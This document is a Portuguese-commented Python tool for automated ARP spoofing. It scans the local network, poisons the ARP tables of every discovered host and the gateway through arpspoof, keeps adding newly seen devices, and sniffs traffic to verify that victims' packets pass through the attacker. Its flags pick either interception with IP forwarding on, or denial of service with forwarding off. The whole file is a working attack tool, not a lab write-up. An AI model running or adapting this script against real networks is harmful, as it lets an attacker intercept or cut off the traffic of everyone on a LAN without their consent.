import os
import sys
import subprocess
import socket
import psutil
import ipaddress
import argparse
import threading
import time
import netifaces
from scapy.all import ARP, Ether, srp, sniff, IP, ICMP, sr1

# Bloqueio de thread para proteger recursos compartilhados
hosts_lock = threading.Lock()
active_spoof_ips = set()
running_processes = {}

# Verifica se está rodando como root
if os.geteuid() != 0:
    print("Execute como root.")
    sys.exit(1)


# Pega gateway e interface padrão
def get_default_gateway():
    result = subprocess.run(["ip", "route"], capture_output=True, text=True)

    for line in result.stdout.splitlines():
        if line.startswith("default"):
            parts = line.split()
            gateway = parts[2]
            interface = parts[4]
            return gateway, interface

    return None, None


# Obtém informações da LAN
def get_lan_info():
    gateway, interface = get_default_gateway()

    if not gateway or not interface:
        return None

    interfaces = psutil.net_if_addrs()

    for addr in interfaces[interface]:
        if addr.family == socket.AF_INET:
            return {
                "interface": interface,
                "ip": addr.address,
                "netmask": addr.netmask,
                "gateway": gateway
            }

    return None


# Escaneia hosts ativos via ARP
def scan_hosts(interface, ip, netmask):
    network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)

    arp = ARP(pdst=str(network))
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    result = srp(packet, timeout=2, iface=interface, verbose=False)[0]

    hosts_up = []
    for sent, received in result:
        hosts_up.append(received.psrc)

    return hosts_up


# Remove gateway e IP local para evitar auto-ataque
def filter_hosts(hosts, interface, my_ip, gateway, spoof_gateway=False):
    filtered_hosts = [ip for ip in hosts if ip != my_ip and (spoof_gateway or ip != gateway)]
    return filtered_hosts


# Salva IPs no arquivo apenas para fins de log histórico
def save_hosts_to_file(hosts, filename="ips.txt"):
    with hosts_lock:
        with open(filename, "w") as file:
            for ip in hosts:
                file.write(ip + "\n")


# FUNÇÃO NOVA: Valida se o envenenamento ARP funcionou no IP alvo
def verify_spoof_success(interface, target_ip, gateway_ip):

    try:
        my_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr'].lower()

        def pkt_filter(p):
            try:
                if IP in p and p[IP].src == target_ip:
                    return p[Ether].dst.lower() == my_mac
                return False
            except Exception:
                return False

        # Sniff passivo inicial
        packets = sniff(iface=interface, timeout=3, count=3, lfilter=pkt_filter)
        if packets:
            return "SUCESSO (Tráfego roteado via atacante)"

        return "SEM TRÁFEGO / INCONCLUSIVO"
    except Exception as e:
        return f"ERRO DE CHECAGEM: {e}"


# Thread contínua que busca novos dispositivos a cada X segundos
def monitor_new_hosts(lan_info, interval=10, spoof_gateway=False):
    global active_spoof_ips
    print(f"[*] Monitor de novos hosts iniciado (Intervalo: {interval}s)...")
    
    while True:
        time.sleep(interval)
        try:
            hosts = scan_hosts(
                lan_info["interface"],
                lan_info["ip"],
                lan_info["netmask"]
            )
            
            filtered = filter_hosts(
                hosts,
                lan_info["interface"],
                lan_info["ip"],
                lan_info["gateway"],
                spoof_gateway
            )
            
            with hosts_lock:
                new_hosts = [ip for ip in filtered if ip not in active_spoof_ips]
                
                if new_hosts:
                    print("\n[+] Novos hosts descobertos em tempo real:")
                    for ip in new_hosts:
                        print(f" -> {ip}")
                        active_spoof_ips.add(ip)
                    
                    save_hosts_to_file(sorted(list(active_spoof_ips)))
                    
        except Exception as e:
            print(f"Erro no monitor de hosts: {e}")


# NOVA THREAD: Avalia ciclicamente a eficiência do ataque contra os alvos
def health_check_spoofing(lan_info, interval=8):
    print(f"[*] Verificador de integridade do Spoofing ativo (Intervalo: {interval}s)...")
    while True:
        time.sleep(interval)
        with hosts_lock:
            targets = list(active_spoof_ips)
            
        if targets:
            print("\n=== STATUS DO ATAQUE ARP (HEALTH CHECK) ===")
            for ip in targets:
                status = verify_spoof_success(lan_info["interface"], ip, lan_info["gateway"])
                print(f" Alvo: {ip:<15} -> Status: {status}")
            print("===========================================\n")


# Gerencia dinamicamente os processos arpspoof
def dynamic_arp_spoofing(lan_info):
    global active_spoof_ips, running_processes
    print("[*] Mecanismo dinâmico de Spoofing operacional.")

    try:
        while True:
            with hosts_lock:
                current_targets = list(active_spoof_ips)

            for ip in current_targets:
                # Verifica se já existe par de processos ativos para este IP
                if ip not in running_processes or any(
                    proc.poll() is not None for proc in running_processes[ip]
                ):
                    print(f"[+] Iniciando arpspoof bidirecional contra: {ip}")

                    try:
                        # Instancia 1: envenena a tabela da vitima
                        proc_to_victim = subprocess.Popen([
                            "arpspoof",
                            "-i", lan_info["interface"],
                            "-t", ip,
                            lan_info["gateway"]
                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                        # Instancia 2: envenena a tabela do gateway
                        proc_to_gateway = subprocess.Popen([
                            "arpspoof",
                            "-i", lan_info["interface"],
                            "-t", lan_info["gateway"],
                            ip
                        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                        running_processes[ip] = [proc_to_victim, proc_to_gateway]
                    except Exception as e:
                        print(f"Erro ao iniciar arpspoof para {ip}: {e}")

            time.sleep(2)

    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Erro crítico em dynamic_arp_spoofing: {e}")


def set_ip_forwarding(enable: bool):
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1" if enable else "0")

        if enable:
            print("[+] IP Forwarding HABILITADO (Modo Homem no Meio / MitM).")
        else:
            print("[-] IP Forwarding DESABILITADO (Modo Negação de Serviço / DoS).")

    except Exception as e:
        print("Erro ao configurar IP Forwarding:", e)
        sys.exit(1)


# MAIN
lan_info_global = None

def main():
    global active_spoof_ips, running_processes, lan_info_global
    
    parser = argparse.ArgumentParser(description="Scanner de Rede + ARP Spoofing Dinâmico")
    parser.add_argument("--forward", action="store_true", help="Habilita IP Forwarding (Interceptação)")
    parser.add_argument("--no-forward", action="store_true", help="Desabilita IP Forwarding (Ataque DoS)")
    parser.add_argument("--spoof-gateway", action="store_true", help="Inclui o gateway na lista de alvos")
    
    args = parser.parse_args()

    if args.forward and args.no_forward:
        print("Erro: Escolha apenas uma opção: --forward OU --no-forward")
        sys.exit(1)

    if args.forward:
        set_ip_forwarding(True)
    else:
        set_ip_forwarding(False)

    lan_info = get_lan_info()
    lan_info_global = lan_info
    if not lan_info:
        print("Erro: Não foi possível mapear as propriedades da rede local.")
        return

    print("\n=== INFORMAÇÕES DA LAN ===")
    print("Interface Ativa: ", lan_info["interface"])
    print("Seu IP Local:    ", lan_info["ip"])
    print("Gateway/Roteador:", lan_info["gateway"])
    print("==========================\n")

    print("[*] Realizando varredura ARP inicial na rede...")
    initial_hosts = scan_hosts(
        lan_info["interface"],
        lan_info["ip"],
        lan_info["netmask"]
    )

    valid_targets = filter_hosts(
        initial_hosts,
        lan_info["interface"],
        lan_info["ip"],
        lan_info["gateway"],
        args.spoof_gateway
    )

    with hosts_lock:
        active_spoof_ips = set(valid_targets)

    print(f"\n[+] {len(active_spoof_ips)} alvos iniciais qualificados encontrados.")
    for ip in active_spoof_ips:
        print(f" -> {ip}")

    save_hosts_to_file(sorted(list(active_spoof_ips)))

    # Thread 1: Monitor de novos dispositivos
    monitor_thread = threading.Thread(
        target=monitor_new_hosts,
        args=(lan_info, 10, args.spoof_gateway),
        daemon=True
    )
    monitor_thread.start()

    # Thread 2: Verificador ativo de eficácia (Health Check)
    health_thread = threading.Thread(
        target=health_check_spoofing,
        args=(lan_info, 8),
        daemon=True
    )
    health_thread.start()

    try:
        dynamic_arp_spoofing(lan_info)
    except KeyboardInterrupt:
        print("\n\n[-] Interrupção detectada! Iniciando procedimentos de finalização...")
    finally:
        total = sum(len(procs) for procs in running_processes.values())
        print(f"[*] Encerrando {total} processos ativos do arpspoof...")
        for procs in running_processes.values():
            for proc in procs:
                try:
                    proc.terminate()
                    proc.wait(timeout=1)
                except Exception:
                    proc.kill()
        print("[+] Concluído. Rede reestabelecida com sucesso.")


if __name__ == "__main__":
    main()
